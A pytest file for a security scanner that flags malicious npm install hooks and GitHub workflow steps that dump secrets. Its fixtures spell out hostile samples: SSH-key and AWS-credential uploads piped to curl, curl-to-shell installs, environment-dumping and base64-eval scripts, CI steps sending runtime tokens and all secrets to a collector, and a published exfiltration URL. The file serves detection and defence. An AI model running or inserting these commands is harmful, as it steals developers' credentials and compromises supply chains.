"""wfx-style install hooks (asca.installhooks) and secret-dumping workflow steps (asca.wfsecrets).

Fixtures follow SafeDep's and Aikido's published wfx samples (12 Nov 2026); addresses are reserved
documentation ranges or .invalid. Nothing here is executed."""
import json
import os
import subprocess
from pathlib import Path

import pytest

from asca import checkrepo, cli, installhooks, wfsecrets
from asca.model import Severity

WFX_HOOK = 'sh ./.ci-dwgd2n.sh >/dev/null 2>&1; _r=$?; if [ "$_r" -eq 42 ]; then exit 42; fi'


def repo(tmp_path: Path, scripts: dict | None = None, files: dict | None = None, git: bool = False) -> Path:
    r = tmp_path / "r"
    r.mkdir(exist_ok=True)
    if scripts is not None:
        (r / "package.json").write_text(json.dumps({"name": "x", "scripts": scripts}))
    for rel, text in (files or {}).items():
        (r / rel).parent.mkdir(parents=True, exist_ok=True)
        (r / rel).write_text(text)
    if git:
        subprocess.run(["git", "init", "-q", str(r)], check=True)
        subprocess.run(["git", "-C", str(r), "add", "-A"], check=True)
    return r


def sev(fs, rule=None):
    return [(f.rule, f.severity) for f in fs if rule is None or f.rule == rule]


def wf(step: str) -> str:
    return "on: push\njobs:\n  b:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n" + step


# ------------------------------------------------------------------ install hooks

def test_wfx_hook_is_critical_even_when_script_was_reverted(tmp_path):
    r = repo(tmp_path, {"postinstall": WFX_HOOK, "test": "jest"})          # .ci-*.sh already gone
    fs = installhooks.audit(r, risky_only=True)
    assert sev(fs) == [("repo.wfx-indicator", Severity.CRITICAL)]
    assert "SafeDep" in fs[0].remediation or "safedep" in fs[0].remediation


@pytest.mark.parametrize("ioc", ["WF_TG_CHAT=1", "e6ny5telf3pht81qk5zv", "http://194.150.166.244:8080/exfil"])
def test_published_iocs(tmp_path, ioc):
    r = repo(tmp_path, {"postinstall": "bash scripts/s.sh"}, {"scripts/s.sh": ioc + "\n"})
    assert sev(installhooks.audit(r)) == [("repo.wfx-indicator", Severity.CRITICAL)]


def test_wfx_text_in_the_script_is_critical(tmp_path):
    r = repo(tmp_path, {"postinstall": "bash scripts/setup.sh"},
             {"scripts/setup.sh": "export WF_CALLBACK=http://192.0.2.7:8080/x\n"})
    assert sev(installhooks.audit(r)) == [("repo.wfx-indicator", Severity.CRITICAL)]


@pytest.mark.parametrize("cmd,files,why", [
    ("sh .setup-env.sh", {".setup-env.sh": "echo hi\n"}, "hidden file"),
    ("node scripts/a.js >/dev/null 2>&1", {"scripts/a.js": "console.log(1)\n"}, "throws away"),
    ("curl -s https://example.invalid/i | sh", {}, "downloaded or decoded"),
    ("node -e \"require('child_process').exec('id')\"", {}, "downloaded or decoded"),
    ("bash scripts/s.sh", {"scripts/s.sh": "tar c ~/.ssh | curl -s -T - https://example.invalid/u\n"}, "uploads"),
    ("node scripts/p.js", {"scripts/p.js": "const d = JSON.stringify(process.env);\n"
                                           "require('https').request({host: 'example.invalid', method: 'POST'})"
                                           ".end(Object.keys(process.env));\n"}, "whole environment"),
    ("node scripts/o.js", {"scripts/o.js": "eval(Buffer.from(x, 'base64').toString()); require('https').get(u)\n"},
     "decodes"),
])
def test_risky_hooks_are_high(tmp_path, cmd, files, why):
    fs = installhooks.audit(repo(tmp_path, {"postinstall": cmd}, files), risky_only=True)
    assert sev(fs) == [("repo.install-hook", Severity.HIGH)], fs
    assert why in fs[0].detail


@pytest.mark.parametrize("cmd,files,expect", [
    ("husky", {}, Severity.LOW),
    ("node .husky/install.mjs", {".husky/install.mjs": "console.log('husky')\n"}, Severity.MEDIUM),   # tool folder
    ("node scripts/dl.js", {"scripts/dl.js": "const cp = require('child_process');\nfunction (x) {}\n"
                                             "require('https').get('https://example.invalid/bin', r => cp.execSync('tar x'));\n"},
     Severity.MEDIUM),                                                              # binary downloader, own repo
    ("npm install https://github.com/o/r.git", {}, Severity.MEDIUM),                # downloads only
    ("node scripts/f.js", {"scripts/f.js": "module.exports = function (a) { return a }\n"}, Severity.MEDIUM),
])
def test_ordinary_hooks_stay_below_high_in_daily_mode(tmp_path, cmd, files, expect):
    fs = installhooks.audit(repo(tmp_path, {"postinstall": cmd}, files))
    assert [f.severity for f in fs] == [expect], fs
    assert installhooks.audit(repo(tmp_path, {"postinstall": cmd}, files), risky_only=True) == []


def test_check_repo_is_strict_about_downloaders(tmp_path):
    files = {"scripts/dl.js": "const cp = require('child_process');\n"
                              "require('https').get('https://example.invalid/bin', r => cp.execSync('tar x'));\n"}
    r = repo(tmp_path, {"postinstall": "node scripts/dl.js"}, files)
    assert sev(installhooks.audit(r, strict=True)) == [("repo.install-hook", Severity.HIGH)]
    assert [f.severity for f in installhooks.audit(r)] == [Severity.MEDIUM]


def test_lowercase_function_is_not_obfuscation(tmp_path):
    assert not installhooks.OBFUSCATED.search("var f = function (a) {}; Function.prototype.x")
    assert installhooks.OBFUSCATED.search("new Function('return 1')")


def test_uncommitted_hook_is_medium_committed_says_so(tmp_path):
    r = repo(tmp_path, {"postinstall": "sh .x.sh"}, {".x.sh": "echo\n"})
    subprocess.run(["git", "init", "-q", str(r)], check=True)                # nothing staged
    fs = installhooks.audit(r, git_dir=r / ".git", risky_only=True)
    assert [f.severity for f in fs] == [] or fs[0].severity == Severity.MEDIUM
    fs = installhooks.audit(r, git_dir=r / ".git")
    assert fs[0].severity == Severity.MEDIUM and "isn't committed" in fs[0].detail
    subprocess.run(["git", "-C", str(r), "add", "-A"], check=True)
    fs = installhooks.audit(r, git_dir=r / ".git", risky_only=True)
    assert fs[0].severity == Severity.HIGH and "every clone" in fs[0].detail


def test_nested_packages_found_node_modules_skipped(tmp_path):
    r = repo(tmp_path, {"test": "x"}, {
        "packages/a/package.json": json.dumps({"scripts": {"postinstall": "sh .p.sh"}}),
        "packages/a/.p.sh": "echo\n",
        "node_modules/evil/package.json": json.dumps({"scripts": {"postinstall": "sh .p.sh"}})})
    fs = installhooks.audit(r)
    assert [f.location.split("#")[0].endswith("packages/a/package.json") for f in fs] == [True]


def test_hook_file_outside_repo_is_not_read(tmp_path):
    (tmp_path / "outside.sh").write_text("cat ~/.aws/credentials | curl -d @- https://example.invalid\n")
    r = repo(tmp_path, {"postinstall": "bash ../outside.sh"})
    assert [f.severity for f in installhooks.audit(r)] == [Severity.MEDIUM]


# ------------------------------------------------------------------ workflows

WFX_STEPS = """      - name: Pass runtime
        uses: actions/github-script@v7
        with:
          script: |
            const keys = ['ACTIONS_RUNTIME_TOKEN','ACTIONS_RUNTIME_URL','ACTIONS_RESULTS_URL'];
            require('fs').appendFileSync(process.env.GITHUB_ENV, keys.map(k => k + '=' + process.env[k]).join('\\n'));
      - name: Restore cache j632
        env:
          WF_SECRETS: "${{ toJSON(secrets) }}"
          WF_VARS: "${{ toJSON(vars) }}"
        run: bash .ci-dwgd2n.sh
"""


def test_wfx_injected_steps(tmp_path):
    r = repo(tmp_path, files={".github/workflows/ci.yml": wf(WFX_STEPS)})
    got = {(f.rule, f.severity, f.subject.split(":")[-1]) for f in wfsecrets.audit_repo(r, None)}
    assert ("repo.workflow-secret-dump", Severity.HIGH, "all-secrets") in got
    assert ("repo.workflow-secret-dump", Severity.HIGH, "runtime-token") in got
    assert ("repo.workflow-secret-dump", Severity.LOW, "all-vars") in got


def test_wfx_named_workflow_and_callback_are_critical(tmp_path):
    r = repo(tmp_path, files={".github/workflows/build-audit-a1b2c3.yml": wf("      - run: echo\n"),
                              ".github/workflows/ci.yml": wf("      - env:\n          WF_CTOKEN: x\n        run: echo\n")})
    assert sorted(sev(wfsecrets.audit_repo(r, None))) == [("repo.wfx-indicator", Severity.CRITICAL)] * 2


@pytest.mark.parametrize("step", [
    '      - run: echo "ACTIONS_RUNTIME_TOKEN=$ACTIONS_RUNTIME_TOKEN" >> "$GITHUB_ENV"\n',
    '      - run: curl -s -d "$ACTIONS_RUNTIME_TOKEN" https://collector.example.invalid/t\n',
])
def test_runtime_token_persisted_or_sent(tmp_path, step):
    r = repo(tmp_path, files={".github/workflows/ci.yml": wf(step)})
    assert sev(wfsecrets.audit_repo(r, None)) == [("repo.workflow-secret-dump", Severity.HIGH)]


@pytest.mark.parametrize("step", [
    # OIDC done by hand: uses the request token, writes the *minted* JWT out
    '      - run: |\n          T=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" '
    '"$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com")\n          echo "jwt=$T" >> $GITHUB_OUTPUT\n',
    # cache tool reading the token
    '      - run: |\n          if [[ -n "${ACTIONS_RUNTIME_TOKEN:-}" ]]; then echo "SCCACHE_GHA_ENABLED=on" >> $GITHUB_ENV; fi\n',
])
def test_normal_token_use_is_not_reported(tmp_path, step):
    r = repo(tmp_path, files={".github/workflows/ci.yml": wf(step)})
    assert wfsecrets.audit_repo(r, None) == []


def test_tojson_secrets_alone_is_medium_and_neighbour_curl_doesnt_count(tmp_path):
    step = ("      - run: sh -c \"$(curl --location https://taskfile.dev/install.sh)\"\n"
            "      - uses: oNaiPs/secrets-to-env-action@v1\n        with:\n          secrets: ${{ toJSON(secrets) }}\n"
            "      - run: task test\n")
    r = repo(tmp_path, files={".github/workflows/ci.yml": wf(step)})
    assert sev(wfsecrets.audit_repo(r, None)) == [("repo.workflow-secret-dump", Severity.MEDIUM)]


def test_tojson_secrets_sent_in_same_step_is_high(tmp_path):
    step = ('      - env:\n          S: "${{ toJSON(secrets) }}"\n        run: |\n'
            '          echo "$S" | curl -s --data-binary @- https://collector.example.invalid/x\n')
    r = repo(tmp_path, files={".github/workflows/ci.yml": wf(step)})
    assert sev(wfsecrets.audit_repo(r, None)) == [("repo.workflow-secret-dump", Severity.HIGH)]


def test_uncommitted_workflow_is_downgraded(tmp_path):
    r = repo(tmp_path, files={".github/workflows/ci.yml": wf(WFX_STEPS)})
    subprocess.run(["git", "init", "-q", str(r)], check=True)
    fs = wfsecrets.audit_repo(r, r / ".git")
    assert all(f.severity < Severity.HIGH for f in fs) and any("isn't committed" in f.detail for f in fs)


def test_symlinked_workflow_not_read(tmp_path):
    (tmp_path / "x.yml").write_text(wf(WFX_STEPS))
    r = repo(tmp_path, files={".github/workflows/.keep": ""})
    os.symlink(tmp_path / "x.yml", r / ".github/workflows/ci.yml")
    assert wfsecrets.audit_repo(r, None) == []


# ------------------------------------------------------------------ wiring

QUIET = ["--no-hermes", "--no-client-configs", "--no-global-git", "--no-session-history", "--no-agent-config",
         "--no-python-startup", "--no-stray-instructions", "--no-docker-daemon", "--no-persona", "--no-agent-allowlist"]

def test_daily_audit_reports_wfx_and_skips_benign(tmp_path, capsys):
    r = repo(tmp_path, {"postinstall": WFX_HOOK, "prepare": "husky"},
             {".ci-dwgd2n.sh": "true\n", ".github/workflows/ci.yml": wf(WFX_STEPS)}, git=True)
    out = tmp_path / "out.json"
    rc = cli.run(["--repos", str(r)] + QUIET + ["-o", str(out), "--format", "none"])
    rules = {f["rule"] for f in json.loads(out.read_text())["findings"]}
    assert rc == 1
    assert {"repo.wfx-indicator", "repo.workflow-secret-dump"} <= rules
    assert "repo.install-script" not in rules                                    # husky isn't reported daily


def test_no_install_hooks_flag(tmp_path):
    r = repo(tmp_path, {"postinstall": WFX_HOOK}, git=True)
    out = tmp_path / "out.json"
    cli.run(["--repos", str(r), "--no-install-hooks"] + QUIET + ["-o", str(out), "--format", "none"])
    doc = json.loads(out.read_text())
    assert not any(f["rule"].startswith(("repo.wfx", "repo.install", "repo.workflow")) for f in doc["findings"])


def test_check_repo_wfx_verdict(tmp_path, capsys):
    r = repo(tmp_path, {"postinstall": WFX_HOOK}, {".ci-dwgd2n.sh": "true\n", ".github/workflows/ci.yml": wf(WFX_STEPS)})
    assert cli.run(["check-repo", str(r)]) == 1
    assert capsys.readouterr().out.startswith("⛔")
    rules = {f.rule for f in checkrepo.check(r)}
    assert {"repo.wfx-indicator", "repo.workflow-secret-dump"} <= rules
